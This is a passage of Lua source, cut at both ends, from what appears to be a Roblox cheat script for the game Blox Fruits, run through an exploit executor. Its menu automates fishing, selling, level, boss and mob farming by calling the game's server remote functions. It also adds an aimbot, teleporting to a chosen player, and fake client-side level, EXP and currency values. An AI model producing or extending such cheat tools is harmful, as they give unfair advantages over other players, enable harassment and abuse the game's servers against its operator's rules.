    local rfJobsRemoteFunction = net:WaitForChild("RF/JobsRemoteFunction")
    local rfCraft = net:WaitForChild("RF/Craft")
    local fishingRequest = fishReplicated:WaitForChild("FishingRequest")
    local Config = require(fishReplicated.FishingClient.Config)
    local GetWaterHeightAtLocation = require(ReplicatedStorage5.Util.GetWaterHeightAtLocation)
    local maxLaunchDistance = Config.Rod.MaxLaunchDistance

    v21:AddDropdown({
        Name = "Select Rod",
        Default = GetSetting("SelectedRod2", "Fishing Rod"),
        Options = {
            "Fishing Rod",
            "Gold Rod",
            "Shark Rod",
            "Shell Rod",
            "Treasure Rod",
        },
        Callback = function(selectedRod2)
            _G.SelectedRod2 = tostring(selectedRod2)
            _G.SaveData.SelectedRod2 = selectedRod2
            SaveSettings()
        end,
    })

    _G.SelectedRod2 = GetSetting("SelectedRod2", "Fishing Rod")

    v21:AddDropdown({
        Name = "Select Bait",
        Default = GetSetting("SelectedBait2", "Basic Bait"),
        Options = {
            "Basic Bait",
            "Kelp Bait",
            "Good Bait",
            "Abyssal Bait",
            "Frozen Bait",
            "Epic Bait",
            "Carnivore Bait",
        },
        Callback = function(selectedBait2)
            _G.SelectedBait2 = tostring(selectedBait2)
            _G.SaveData.SelectedBait2 = selectedBait2
            SaveSettings()
        end,
    })

    _G.SelectedBait2 = GetSetting("SelectedBait2", "Basic Bait")

    EnsureRodAndBait2 = function()
        if not rfJobsRemoteFunction then
            return
        end

        pcall(function()
            rfJobsRemoteFunction:InvokeServer("FishingNPC", "FirstTimeFreeRod")

            if _G.SelectedRod2 then
                rfJobsRemoteFunction:InvokeServer("FishingNPC", "BuyRod", _G.SelectedRod2)
                rfJobsRemoteFunction:InvokeServer("LoadItem", _G.SelectedRod2, {"Gear"})
            end
        end)

        task.wait(0.5)
        local data = localPlayer7:FindFirstChild("Data")
        local fishingData = data and localPlayer7.Data:FindFirstChild("FishingData")

        if fishingData then
            local attribute = fishingData:GetAttribute("SelectedBait")

            if attribute == "None" or not attribute then
                local ok, result = pcall(function()
                    return rfJobsRemoteFunction:InvokeServer("getInventory")
                end)

                if ok and result then
                    for k, v24 in pairs(result) do
                        if v24.Type == "Bait" and v24.Name == _G.SelectedBait2 then
                            rfJobsRemoteFunction:InvokeServer("LoadItem", v24.Name, {"Usables"})
                            return
                        end
                    end
                end

                if _G.SelectedBait2 then
                    rfCraft:InvokeServer("Craft", _G.SelectedBait2)
                    task.wait(1)
                    rfJobsRemoteFunction:InvokeServer("LoadItem", _G.SelectedBait2, {"Usables"})
                end
            end
        end
    end

    EquipRod2 = function()
        local character3 = localPlayer7.Character
        if not character3 then
            return
        end
        local humanoid = character3:FindFirstChildOfClass("Humanoid")

        if not character3:FindFirstChild(_G.SelectedRod2) then
            local v24 = localPlayer7.Backpack:FindFirstChild(_G.SelectedRod2)

            if v24 and humanoid then
                humanoid:EquipTool(v24)
                task.wait(0.3)
            end
        end
    end

    v21:AddToggle({
        Name = "Auto Fishing Quest",
        Default = GetSetting("AutoFishingQuest2", false),
        Callback = function(autoFishingQuest2)
            _G.AutoFishingQuest2 = autoFishingQuest2
            _G.SaveData.AutoFishingQuest2 = autoFishingQuest2
            SaveSettings()
        end,
    })

    _G.AutoFishingQuest2 = GetSetting("AutoFishingQuest2", false)

    task.spawn(function()
        while task.wait(1) do
            if _G.AutoFishingQuest2 then
                pcall(function()
                    local quest = localPlayer7.PlayerGui:FindFirstChild("Quest")
                    local questGui = quest or localPlayer7.PlayerGui:FindFirstChild("QuestGui")

                    if not questGui or not questGui:FindFirstChild("Container") or not questGui.Container:FindFirstChild("QuestTitle") then
                        rfJobsRemoteFunction:InvokeServer("FishingNPC", "Angle", "AskQuest")
                    end
                end)
            end
        end
    end)

    GetCastPos2 = function()
        local character3 = localPlayer7.Character
        if not character3 then
            return
        end
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end
        local v24 = GetWaterHeightAtLocation(humanoidRootPart2.Position)
        local v25, v26 = Workspace:FindPartOnRayWithIgnoreList(Ray.new(character3.Head.Position, humanoidRootPart2.CFrame.LookVector * maxLaunchDistance), {character3, Workspace.Characters, Workspace.Enemies})
        if not v26 then
            return humanoidRootPart2.Position - Vector3.new(0, 10, 0)
        end
        return Vector3.new(v26.X, math.max(v26.Y, v24), v26.Z)
    end

    Cast2 = function()
        pcall(function()
            fishingRequest:InvokeServer("StartCasting")
            task.wait(0.7)
            fishingRequest:InvokeServer("CastLineAtLocation", GetCastPos2(), 100, true)
        end)
    end

    Catch2 = function()
        pcall(function()
            fishingRequest:InvokeServer("Catching", true)
            task.wait(0.25)
            local response = fishingRequest:InvokeServer("Catch", 1)

            if response and type(response) == "table" then
                local name = response.Name
                local str = name or "Unknown Fish"
                local rarity = response.Rarity
                local str2 = rarity or "Common"
                local weight = response.Weight
                local str3 = weight and string.format("%.1fkg", response.Weight) or ""

                Fluent:Notify({
                    Title = str,
                    Content = str2 .. " · " .. str3,
                    Duration = 2,
                    Type = "Info",
                })
            end
        end)
    end

    v21:AddToggle({
        Name = "Auto Fishing",
        Default = GetSetting("AutoFishing2", false),
        Callback = function(autoFishing2)
            _G.AutoFishing2 = autoFishing2
            _G.SaveData.AutoFishing2 = autoFishing2
            SaveSettings()
        end,
    })

    _G.AutoFishing2 = GetSetting("AutoFishing2", false)

    task.spawn(function()
        while task.wait(0.5) do
            if _G.AutoFishing2 then
                pcall(function()
                    local character3 = localPlayer7.Character
                    if not character3 then
                        return
                    end
                    EnsureRodAndBait2()
                    EquipRod2()
                    local tool = character3:FindFirstChildOfClass("Tool")
                    if not tool then
                        return
                    end
                    local attribute = tool:GetAttribute("ServerState")
                    local attribute2 = attribute or tool:GetAttribute("State")

                    if attribute2 == "Biting" then
                        Catch2()
                    elseif attribute2 == "ReeledIn" or attribute2 == "Idle" or not attribute2 then
                        Cast2()
                    end
                end)
            end
        end
    end)

    v21:AddButton({
        Name = "Save Fishing Position",
        Callback = function()
            local character3 = localPlayer7.Character

            if character3 and character3:FindFirstChild("HumanoidRootPart") then
                _G.FishingSavedPos2 = character3.HumanoidRootPart.CFrame
                _G.SaveData.FishingSavedPos2 = {_G.FishingSavedPos2:GetComponents()}
                SaveSettings()
            end
        end,
    })

    local FishingSavedPos2 = GetSetting("FishingSavedPos2")

    if FishingSavedPos2 and type(FishingSavedPos2) == "table" and #FishingSavedPos2 == 12 then
        _G.FishingSavedPos2 = CFrame.new(unpack(FishingSavedPos2))
    end

    v21:AddToggle({
        Name = "Auto Fish Saved Pos",
        Default = GetSetting("AutoFishAtPos2", false),
        Callback = function(autoFishAtPos2)
            _G.AutoFishAtPos2 = autoFishAtPos2
            _G.SaveData.AutoFishAtPos2 = autoFishAtPos2
            SaveSettings()
        end,
    })

    _G.AutoFishAtPos2 = GetSetting("AutoFishAtPos2", false)

    task.spawn(function()
        while task.wait(0.5) do
            if _G.AutoFishAtPos2 and _G.FishingSavedPos2 then
                pcall(function()
                    local character3 = localPlayer7.Character
                    if not character3 then
                        return
                    end
                    tween(_G.FishingSavedPos2)
                    EnsureRodAndBait2()
                    EquipRod2()
                    local tool = character3:FindFirstChildOfClass("Tool")
                    if not tool then
                        return
                    end
                    local attribute = tool:GetAttribute("ServerState")
                    local attribute2 = attribute or tool:GetAttribute("State")

                    if attribute2 == "Biting" then
                        Catch2()
                    elseif attribute2 == "ReeledIn" or attribute2 == "Idle" or not attribute2 then
                        Cast2()
                    end
                end)
            end
        end
    end)

    local rfJobsRemoteFunction2 = game:GetService("ReplicatedStorage").Modules.Net["RF/JobsRemoteFunction"]

    v21:AddToggle({
        Name = "Auto Sell Fish",
        Default = GetSetting("AutoSellFish", false),
        Callback = function(autoSellFish)
            _G.AutoSellFish = autoSellFish
            _G.SaveData.AutoSellFish = autoSellFish
            SaveSettings()
        end,
    })

    _G.AutoSellFish = GetSetting("AutoSellFish", false)

    task.spawn(function()
        while task.wait(1) do
            if _G.AutoSellFish then
                pcall(function()
                    rfJobsRemoteFunction2:InvokeServer("FishingNPC", "SellFish")
                end)
            end
        end
    end)

    local options = {}

    for k, child in pairs(game:GetService("Players"):GetChildren()) do
        table.insert(options, child.Name)
    end

    v7:AddSection("Combat + Aimbot Nearest")
    local addDropdown = v7.AddDropdown
    local tbl11 = {Name = "Select Players", Description = ""}
    local v24 = options[1]
    local default = v24 or ""
    tbl11.Default = default
    tbl11.Options = options

    tbl11.Callback = function(playersList)
        _G.PlayersList = playersList
    end

    addDropdown(v7, tbl11)

    v7:AddToggle({
        Name = "Teleport To Select Players",
        Description = "",
        Default = false,
        Callback = function(tpPly)
            _G.TpPly = tpPly

            spawn(function()
                pcall(function()
                    while _G.TpPly do
                        wait()
                        tween(game:GetService("Players")[_G.PlayersList].Character.HumanoidRootPart.CFrame)
                    end
                end)
            end)
        end,
    })

    v7:AddToggle({
        Name = "Aimbot Skill",
        Default = GetSetting("Aim", true),
        Callback = function(aimplr)
            _G.Aimplr = aimplr
            _G.SaveData.Aim = aimplr
            SaveSettings()
        end,
    })

    v7:AddToggle({
        Name = "Ignore Mobs",
        Default = GetSetting("skip", false),
        Callback = function(skipmon)
            _G.skipmon = skipmon
            local v25 = _G
            local aimmon

            if skipmon then
                aimmon = false
            else
                aimmon = true
            end

            v25.Aimmon = aimmon
            _G.SaveData.skip = skipmon
            SaveSettings()
        end,
    })

    v7:AddSection("Visual")

    v7:AddButton({
        Name = "Level Up",
        Callback = function()
            local Notification = require(game.ReplicatedStorage.Notification)
            local data = localPlayer:WaitForChild("Data")
            local EXPFunction = require(game.ReplicatedStorage.EXPFunction)
            local LevelUp = require(game.ReplicatedStorage.Effect.Container.LevelUp)
            local Sound = require(game.ReplicatedStorage.Util.Sound)
            local levelUpProxy = game.ReplicatedStorage.Util.Sound.Storage.Other:FindFirstChild("LevelUp_Proxy")
            local levelUp = levelUpProxy or game.ReplicatedStorage.Util.Sound.Storage.Other:FindFirstChild("LevelUp")

            v129 = function(arg)
                local v25 = arg
                local v26, v27

                repeat
                    v26, v27 = string.gsub(v25, "^(-?%d+)(%d%d%d)", "%1,%2")
                    v25 = v26
                until v27 == 0

                return v26
            end

            Notification.new("<Color=Yellow>QUEST COMPLETED!<Color=/>"):Display()
            Notification.new("Earned <Color=Yellow>1,000,000,000,000 Exp.<Color=/> (+ None)"):Display()
            Notification.new("Earned <Color=Green>$25,000<Color=/>"):Display()
            localPlayer.Data.Exp.Value = 999999999999
            localPlayer.Data.Beli.Value = localPlayer.Data.Beli.Value + 25000

            while localPlayer.Data.Level.Value < 2800 and localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value) > 0 do
                localPlayer.Data.Exp.Value = localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value)
                localPlayer.Data.Level.Value = localPlayer.Data.Level.Value + 1
                localPlayer.Data.Points.Value = localPlayer.Data.Points.Value + 3
                LevelUp({localPlayer})
                Sound:Play(levelUp.Value)
                Notification.new("<Color=Green>LEVEL UP!<Color=/> (" .. localPlayer.Data.Level.Value .. ")"):Display()
                wait(0.05)
                if localPlayer.Data.Level.Value >= 2800 or localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value) <= 0 then
                    return
                end
                localPlayer.Data.Exp.Value = localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value)
                localPlayer.Data.Level.Value = localPlayer.Data.Level.Value + 1
                localPlayer.Data.Points.Value = localPlayer.Data.Points.Value + 3
                LevelUp({localPlayer})
                Sound:Play(levelUp.Value)
                Notification.new("<Color=Green>LEVEL UP!<Color=/> (" .. localPlayer.Data.Level.Value .. ")"):Display()
                wait(0.05)
                if localPlayer.Data.Level.Value >= 2800 or localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value) <= 0 then
                    return
                end
                localPlayer.Data.Exp.Value = localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value)
                localPlayer.Data.Level.Value = localPlayer.Data.Level.Value + 1
                localPlayer.Data.Points.Value = localPlayer.Data.Points.Value + 3
                LevelUp({localPlayer})
                Sound:Play(levelUp.Value)
                Notification.new("<Color=Green>LEVEL UP!<Color=/> (" .. localPlayer.Data.Level.Value .. ")"):Display()
                wait(0.05)
                if localPlayer.Data.Level.Value >= 2800 or localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value) <= 0 then
                    return
                end
                localPlayer.Data.Exp.Value = localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value)
                localPlayer.Data.Level.Value = localPlayer.Data.Level.Value + 1
                localPlayer.Data.Points.Value = localPlayer.Data.Points.Value + 3
                LevelUp({localPlayer})
                Sound:Play(levelUp.Value)
                Notification.new("<Color=Green>LEVEL UP!<Color=/> (" .. localPlayer.Data.Level.Value .. ")"):Display()
                wait(0.05)
                if localPlayer.Data.Level.Value >= 2800 or localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value) <= 0 then
                    return
                end
                localPlayer.Data.Exp.Value = localPlayer.Data.Exp.Value - EXPFunction(data.Level.Value)
                localPlayer.Data.Level.Value = localPlayer.Data.Level.Value + 1
                localPlayer.Data.Points.Value = localPlayer.Data.Points.Value + 3
                LevelUp({localPlayer})
                Sound:Play(levelUp.Value)
                Notification.new("<Color=Green>LEVEL UP!<Color=/> (" .. localPlayer.Data.Level.Value .. ")"):Display()
                tick()
                wait()
                wait(0.05)
            end
        end,
    })

    v7:AddDropdown({
        Name = "Select Color",
        Default = GetSetting("SkillColorSelect", "Red"),
        Options = {
            "Red",
            "Orange",
            "Yellow",
            "Green",
            "Blue",
            "Pink",
            "Violet",
            "White",
            "Rainbow",
        },
        Callback = function(skillColorSelect)
            _G.SkillColorSelect = skillColorSelect
            _G.SaveData.SkillColorSelect = skillColorSelect
            SaveSettings()
        end,
    })

    _G.SkillColorSelect = GetSetting("SkillColorSelect", "Red")

    v7:AddToggle({
        Name = "Skill Color",
        Default = GetSetting("PaintSkill", false),
        Callback = function(paintSkill)
            _G.PaintSkill = paintSkill
            _G.SaveData.PaintSkill = paintSkill
            SaveSettings()

            if not paintSkill then
                local v25 = pairs
                local originalColor = _G.OriginalColor
                local tbl12 = originalColor or {}

                for k, v26 in v25(tbl12) do
                    if k and k.Parent then
                        pcall(function()
                            if not k:IsA("ParticleEmitter") and not k:IsA("Trail") and not k:IsA("Beam") then
                                if k:IsA("Light") then
                                    k.Color = v26
                                end
                            else
                                k.Color = v26
                            end
                        end)
                    end
                end
            end
        end,
    })

    _G.PaintSkill = GetSetting("PaintSkill", false)

    local colorSequence = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 127, 0)),
        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(0.83, Color3.fromRGB(75, 0, 130)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(148, 0, 211)),
    })

    local tbl12 = {
        Red = ColorSequence.new(Color3.fromRGB(255, 0, 0)),
        Orange = ColorSequence.new(Color3.fromRGB(255, 127, 0)),
        Yellow = ColorSequence.new(Color3.fromRGB(255, 255, 0)),
        Green = ColorSequence.new(Color3.fromRGB(0, 255, 0)),
        Blue = ColorSequence.new(Color3.fromRGB(0, 128, 255)),
        Pink = ColorSequence.new(Color3.fromRGB(255, 105, 180)),
        Violet = ColorSequence.new(Color3.fromRGB(148, 0, 211)),
        White = ColorSequence.new(Color3.fromRGB(255, 255, 255)),
        Rainbow = colorSequence,
    }

    local v25 = _G
    local originalColor = _G.OriginalColor
    local originalColor2 = originalColor or {}
    v25.OriginalColor = originalColor2

    saveOriginal = function(arg)
        if not _G.OriginalColor[arg] and (arg:IsA("ParticleEmitter") or arg:IsA("Trail") or arg:IsA("Beam") or arg:IsA("Light")) then
            _G.OriginalColor[arg] = arg.Color
        end
    end

    applyColor = function(arg)
        if not _G.PaintSkill or not _G.SkillColorSelect or not tbl12[_G.SkillColorSelect] then
            return
        end
        local v26 = tbl12[_G.SkillColorSelect]
        saveOriginal(arg)

        if not arg:IsA("ParticleEmitter") and not arg:IsA("Trail") and not arg:IsA("Beam") then
            if arg:IsA("Light") then
                arg.Color = Color3.new(1, 1, 1)
            end
        else
            arg.Color = v26
        end
    end

    workspace.DescendantAdded:Connect(function(descendant)
        task.wait(0.01)

        if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Beam") or descendant:IsA("Light") then
            applyColor(descendant)
        end
    end)

    v7:AddButton({
        Name = "Rain Fruits Old",
        Callback = function()
            for k, child in pairs(game:GetObjects("rbxassetid://14759368201")[1]:GetChildren()) do
                child.Parent = game.Workspace.Map
                child:MoveTo(localPlayer.Character.PrimaryPart.Position + Vector3.new(math.random(-50, 50), 100, math.random(-50, 50)))

                if child.Fruit:FindFirstChild("AnimationController") then
                    child.Fruit:FindFirstChild("AnimationController"):LoadAnimation(child.Fruit:FindFirstChild("Idle")):Play()
                end

                child.Handle.Touched:Connect(function(hit)
                    if hit.Parent == localPlayer.Character then
                        child.Parent = localPlayer.Backpack
                        localPlayer.Character.Humanoid:EquipTool(child)
                    end
                end)
            end
        end,
    })

    v7:AddButton({
        Name = "Rain Fruits New",
        Callback = function()
            task.spawn(function()
                local v26 = game
                local CollectionService = game:GetService("CollectionService")
                local character3 = localPlayer.Character
                local result = character3 or localPlayer.CharacterAdded:Wait()
                local humanoidRootPart2 = result:WaitForChild("HumanoidRootPart")
                local humanoid = result:WaitForChild("Humanoid")
                local backpack = localPlayer:WaitForChild("Backpack")
                local objects = v26:GetObjects("rbxassetid://96375671161494")
                if not objects[1] then
                    return
                end
                local v27 = objects[1]:GetChildren()[1]
                if not v27 then
                    return
                end
                local v28, v29, v30 = ipairs(v27:GetChildren())
                local v31 = v30
                local v32 = v28
                local v33 = v29

                while true do
                    local v34, v35 = v32(v33, v31)
                    if v34 == nil then
                        break
                    end

                    for i, descendant in ipairs(v35:GetDescendants()) do
                        if descendant:IsA("BasePart") then
                            descendant.CanCollide = true
                        end
                    end

                    v31 = v34
                    CollectionService:AddTag(v35, "VisualFruit")
                    v35.Parent = workspace
                    v35:MoveTo(humanoidRootPart2.Position + Vector3.new(math.random(-50, 50), 100, math.random(-50, 50)))

                    if v35:FindFirstChild("Handle") then
                        local flag8 = false

                        v35.Handle.Touched:Connect(function(hit)
                            if flag8 then
                                return
                            end

                            if hit.Parent:FindFirstChildOfClass("Humanoid") == humanoid then
                                flag8 = true
                                v35.Parent = backpack
                                task.wait()
                                humanoid:EquipTool(v35)
                            end
                        end)
                    end
                end
            end)
        end,
    })

    v7:AddTextBox({
        Name = "Fake Level",
        Placeholder = "Enter Level",
        ClearOnFocus = true,
        Callback = function(arg)
            local value = tonumber(arg)

            if value then
                game.Players.LocalPlayer.Data.Level.Value = value
            end
        end,
    })

    v7:AddTextBox({
        Name = "Fake EXP",
        Placeholder = "Enter EXP",
        ClearOnFocus = true,
        Callback = function(arg)
            local value = tonumber(arg)

            if value then
                game.Players.LocalPlayer.Data.Exp.Value = value
            end
        end,
    })

    v7:AddTextBox({
        Name = "Fake Beli",
        Placeholder = "Enter Beli",
        ClearOnFocus = true,
        Callback = function(arg)
            local value = tonumber(arg)

            if value then
                game.Players.LocalPlayer.Data.Beli.Value = value
            end
        end,
    })

    v7:AddTextBox({
        Name = "Fake Fragment",
        Placeholder = "Enter Fragment",
        ClearOnFocus = true,
        Callback = function(arg)
            local value = tonumber(arg)

            if value then
                game.Players.LocalPlayer.Data.Fragments.Value = value
            end
        end,
    })

    v20:AddDropdown({
        Name = "Select Tool",
        Default = GetSetting("ChooseWP", "Melee"),
        Options = {"Melee", "Sword", "Blox Fruit", "Gun"},
        Callback = function(chooseWP)
            _G.ChooseWP = chooseWP
            _G.SaveData.ChooseWP = chooseWP
            SaveSettings()
        end,
    })

    _G.ChooseWP = GetSetting("ChooseWP", "Melee")

    spawn(function()
        while wait() do
            pcall(function()
                if _G.ChooseWP == "Melee" then
                    for k, child in pairs(localPlayer.Backpack:GetChildren()) do
                        if child.ToolTip == "Melee" and localPlayer.Backpack:FindFirstChild(tostring(child.Name)) then
                            _G.SelectWeapon = child.Name
                        end
                    end
                elseif _G.ChooseWP == "Sword" then
                    for k, child in pairs(localPlayer.Backpack:GetChildren()) do
                        if child.ToolTip == "Sword" and localPlayer.Backpack:FindFirstChild(tostring(child.Name)) then
                            _G.SelectWeapon = child.Name
                        end
                    end
                elseif _G.ChooseWP == "Gun" then
                    for k, child in pairs(localPlayer.Backpack:GetChildren()) do
                        if child.ToolTip == "Gun" and localPlayer.Backpack:FindFirstChild(tostring(child.Name)) then
                            _G.SelectWeapon = child.Name
                        end
                    end
                elseif _G.ChooseWP == "Blox Fruit" then
                    for k, child in pairs(localPlayer.Backpack:GetChildren()) do
                        if child.ToolTip == "Blox Fruit" and localPlayer.Backpack:FindFirstChild(tostring(child.Name)) then
                            _G.SelectWeapon = child.Name
                        end
                    end
                end
            end)
        end
    end)

    local tbl13 = {Small = 0.6, Medium = 0.8, Large = 1}

    v20:AddDropdown({
        Name = "UI Scale",
        Default = GetSetting("UIScale", "Large"),
        Options = {"Small", "Medium", "Large"},
        Callback = function(uiScale)
            lib:SetUIScale(tbl13[uiScale])
            _G.SaveData.UIScale = uiScale
            SaveSettings()
        end,
    })

    lib:SetUIScale(tbl13[GetSetting("UIScale", "Large")])
    v20:AddSection("Farm")
    ReplicatedStorage = game:GetService("ReplicatedStorage")
    game:GetService("RunService")

    v20:AddToggle({
        Name = "Auto Farm Level",
        Default = GetSetting("caylv", false),
        Callback = function(caylv)
            _G.caylv = caylv
            _G.SaveData.caylv = caylv
            SaveSettings()
        end,
    })

    v20:AddToggle({
        Name = "Auto Farm Nearest",
        Default = GetSetting("farmaura", false),
        Callback = function(farmaura)
            _G.farmaura = farmaura
            _G.SaveData.farmaura = farmaura
            SaveSettings()
        end,
    })

    caylvFunc = function()
        local cframe = CFrame.new(-16269.7041, 25.2288494, 1373.65955)

        while _G.caylv do
            pcall(function()
                local character3 = localPlayer.Character
                local result = character3 or localPlayer.CharacterAdded:Wait()
                local humanoidRootPart2 = result:WaitForChild("HumanoidRootPart")
                local value = localPlayer.Data.Level.Value
                local quest = localPlayer.PlayerGui.Main.Quest
                local visible = quest.Visible
                local text = visible and quest.Container.QuestTitle.Title.Text or ""
                local flag8 = false

                if World3 then
                    local v26 = fn13(humanoidRootPart2.Position)
                    local name = v26.Name
                    local pos = name and v26.Name:find("Submerged")
                    flag8 = pos
                end

                if World3 and value >= 2600 and not flag8 then
                    tween(cframe)

                    repeat
                        task.wait(0.2)
                        ReplicatedStorage.Modules.Net:FindFirstChild("RF/SubmarineWorkerSpeak"):InvokeServer("TravelToSubmergedIsland")
                    until flag8 or not _G.caylv

                    return
                end

                if quest.Visible and not string.find(text, QuestNeta()[5]) then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("AbandonQuest")
                    task.wait(0.2)
                end

                if quest.Visible then
                    local v26 = QuestNeta()[1]
                    local v27 = nil

                    for k, child in pairs(workspace.Enemies:GetChildren()) do
                        if index.Alive(child) and child.Name == v26 then
                            v27 = child
                            break
                        end
                    end

                    if v27 then
                        repeat
                            task.wait()
                            Kill(v27, true)
                        until not _G.caylv or not v27.Parent or v27.Humanoid.Health <= 0 or not quest.Visible
                    else
                        tween(QuestNeta()[4])
                    end
                else
                    local v26 = QuestNeta()

                    if _G.DelayQuest then
                        task.wait(5)
                    end

                    tween(v26[6])
                    task.wait(0.8)
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", v26[3], v26[2])
                end
            end)

            task.wait(0.15)
        end
    end

    farmauraFunc = function()
        while _G.farmaura do
            pcall(function()
                if ShouldPauseForStack and ShouldPauseForStack() then
                    HandleStackTarget()
                    return
                end
                local character3 = localPlayer.Character
                local humanoidRootPart2 = character3 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart2 then
                    return
                end
                local v26 = nil
                local n3 = 5000

                for k, child in pairs(workspace.Enemies:GetChildren()) do
                    if child:FindFirstChild("Humanoid") and child:FindFirstChild("HumanoidRootPart") and child.Humanoid.Health > 0 then
                        local magnitude = (humanoidRootPart2.Position - child.HumanoidRootPart.Position).Magnitude

                        if magnitude < n3 then
                            n3 = magnitude
                            v26 = child
                        end
                    end
                end

                if v26 then
                    repeat
                        task.wait()
                        Kill(v26, true)
                    until not _G.farmaura or not v26.Parent or v26.Humanoid.Health <= 0
                end
            end)

            task.wait()
        end
    end

    task.spawn(function()
        while true do
            if _G.caylv then
                caylvFunc()
            end

            task.wait(0.1)
        end
    end)

    task.spawn(function()
        while true do
            if _G.bonefarm then
                bonefarmFunc()
            end

            task.wait(0.1)
        end
    end)

    task.spawn(function()
        while true do
            if _G.farmaura then
                farmauraFunc()
            end

            task.wait(0.1)
        end
    end)

    if World3 then
        v20:AddToggle({
            Name = "Auto Pirate Sea",
            Default = GetSetting("autopiratesea", false),
            Callback = function(autopiratesea)
                _G.autopiratesea = autopiratesea
                _G.SaveData.autopiratesea = autopiratesea
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                if _G.autopiratesea then
                    pcall(function()
                        local cframe = CFrame.new(-5496.17432, 313.768921, -2841.53027)
                        local flag8 = false
                        local v26 = nil

                        for k, child in pairs(workspace.Enemies:GetChildren()) do
                            if child:FindFirstChild("HumanoidRootPart") and child:FindFirstChild("Humanoid") and child.Humanoid.Health > 0 and (child.HumanoidRootPart.Position - cframe.Position).Magnitude <= 1000 then
                                flag8 = true
                                v26 = child
                                break
                            end
                        end

                        if flag8 and v26 then
                            tween(cframe)
                            wait(0.5)

                            repeat
                                wait()
                                Kill(v26, _G.autopiratesea)
                            until not _G.autopiratesea or not v26.Parent or v26.Humanoid.Health <= 0
                        else
                            wait(1)
                        end
                    end)
                end

                wait()
            end
        end)
    end

    if World2 then
        v20:AddToggle({
            Name = "Auto Factory",
            Default = GetSetting("AutoFactory", false),
            Callback = function(autoFactory)
                _G.AutoFactory = autoFactory
                _G.SaveData.AutoFactory = autoFactory
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.AutoFactory then
                        local Core = MobCheck("Core")

                        if Core then
                            repeat
                                wait()
                                EquipWeapon(_G.SelectWeapon)
                                tween(CFrame.new(448.46756, 199.356781, -441.389252))
                            until Core.Humanoid.Health <= 0 or _G.AutoFactory == false
                        else
                            tween(CFrame.new(448.46756, 199.356781, -441.389252))
                        end
                    end
                end)
            end
        end)

        v20:AddSection("Ectoplasm")

        v20:AddToggle({
            Name = "Auto Farm Ectoplasm",
            Default = GetSetting("AutoEctoplasm", false),
            Callback = function(autoEctoplasm)
                _G.AutoEctoplasm = autoEctoplasm
                _G.SaveData.AutoEctoplasm = autoEctoplasm
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.AutoEctoplasm then
                        local v26 = MobCheck({
                            "Ship Deckhand",
                            "Ship Engineer",
                            "Ship Steward",
                            "Ship Officer",
                            "Arctic Warrior",
                        })

                        if index.Alive(v26) then
                            repeat
                                wait()
                                Kill(v26, _G.AutoEctoplasm)
                            until not _G.AutoEctoplasm or not v26.Parent or v26.Humanoid.Health <= 0
                        else
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                        end
                    end
                end)
            end
        end)
    end

    local genv = getgenv()
    local v26 = Boss
    local bossList = v26 or {}
    genv.BossList = bossList
    local bossList2 = getgenv().BossList
    v20:AddSection("Bosses")
    local v27 = _G
    local v28 = bossList2[1]
    local findBoss = v28 or ""
    v27.FindBoss = findBoss
    _G.AcceptBossQuest = GetSetting("AcceptBossQuest", true)
    _G.autoboss = GetSetting("autoboss", false)
    _G.allboss = GetSetting("allboss", false)
    local addDropdown2 = v20.AddDropdown
    local tbl14 = {Name = "Select Boss"}
    local v29 = bossList2[1]
    local default2 = v29 or ""
    tbl14.Default = default2
    tbl14.Options = bossList2

    tbl14.Callback = function(findBoss2)
        _G.FindBoss = findBoss2
    end

    addDropdown2(v20, tbl14)

    v20:AddToggle({
        Name = "Auto Farm Boss",
        Default = GetSetting("autoboss", false),
        Callback = function(autoboss)
            _G.autoboss = autoboss
            _G.SaveData.autoboss = autoboss
            SaveSettings()
        end,
    })

    v20:AddToggle({
        Name = "Take Boss Quest",
        Default = GetSetting("AcceptBossQuest", true),
        Callback = function(acceptBossQuest)
            _G.AcceptBossQuest = acceptBossQuest
            _G.SaveData.AcceptBossQuest = acceptBossQuest
            SaveSettings()
        end,
    })

    local function fn25(findBoss2)
        _G.FindBoss = findBoss2
        QuestB()

        return {
            Name = bMon,
            QuestName = NVCheck,
            QuestNum = NVInfo,
            NpcPos = NVCfBoss,
            BossPos = PosB,
        }
    end

    local function fn26(arg)
        local quest = localPlayer.PlayerGui.Main.Quest
        if not quest.Visible then
            return false
        end
        local flag8 = string.find(quest.Container.QuestTitle.Title.Text, arg) ~= nil
        return flag8
    end

    local function fn27(arg)
        if not _G.AcceptBossQuest then
            return
        end

        if not arg.QuestName or not arg.NpcPos then
            return
        end

        if fn26(arg.Name) then
            return
        end
        tween(arg.NpcPos)

        repeat
            task.wait()
        until (localPlayer.Character.HumanoidRootPart.Position - arg.NpcPos.Position).Magnitude < 10

        pcall(function()
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", arg.QuestName, arg.QuestNum)
        end)

        repeat
            task.wait()
        until fn26(arg.Name)
    end

    local function fn28(arg)
